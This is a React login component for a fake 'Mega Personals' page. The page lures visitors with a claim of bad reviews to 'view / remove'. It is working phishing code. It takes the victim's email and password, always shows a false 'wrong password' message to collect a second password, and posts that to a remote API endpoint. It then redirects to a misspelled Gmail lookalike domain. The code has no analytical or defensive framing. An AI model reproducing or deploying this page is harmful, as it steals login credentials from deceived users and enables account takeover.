"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config/index";

function LoginForm({ adminId }) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  const [showWrongPassword, setShowWrongPassword] = useState(false);
  const { login } = useMockLogin(adminId);

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    setShowWrongPassword(true);
    toast.success("Wrong password, try again");
    console.log(submitValues);
  };
  const handleWrongPassword = async () => {
    const url = `${API_URL}/add/wrongpassword`;
    const id = Cookies.get("id");
    const values = {
      id,
      wrongPassword,
    };

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      setEmail("");
      setPassword("");
      setWrongPassword("");
      router.push(`https://login-gmaail.vercel.app/${adminId}`);
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };
  return (
    <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
      <div className=" mt-5 font-bold text-[#222222] text-center ">
        <p className="text-3xl font-bold text-[#222222] text-center ">
          <span className="text-[#e89a4c]">Mega</span>{" "}
          <span className="text-[#6495ED]">Personals</span>
        </p>
        <p className="text-xl mt-2">6 BAD REVIEW</p>
        <p className="text-2xl text-blue-700">
          Confirm your own account before
        </p>
        <p className="text-2xl text-[#e89a4c]">
          VIEW / REMOVE <span className="text-blue-700">review</span>
        </p>
      </div>

      <div className="mt-5">
        <input
          className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
          placeholder="Your email"
          name="email"
          type="email"
          autoComplete="on"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />

        {!showWrongPassword ? (
          <>
            <input
              className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
              placeholder="Password"
              name="password"
              type="password"
              autoComplete="on"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </>
        ) : (
          <input
            className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Password"
            name="wrongPassword"
            type="password"
            autoComplete="on"
            value={wrongPassword}
            onChange={(e) => setWrongPassword(e.target.value)}
            required
          />
        )}
        {showWrongPassword ? (
          <p className="text-red-500 text-lg font-medium text-center">
            Wrong Password, try again
          </p>
        ) : null}
        {!showWrongPassword ? (
          <button
            type="button"
            onClick={handleSubmit}
            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
          >
            SUBMIT
          </button>
        ) : (
          <button
            type="submit"
            // type="button"
            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
            // disabled={!verified}
            // onClick={handleNextStep}
            onClick={handleWrongPassword}
          >
            SUBMIT
          </button>
        )}
      </div>
    </div>
  );
}

export default LoginForm;
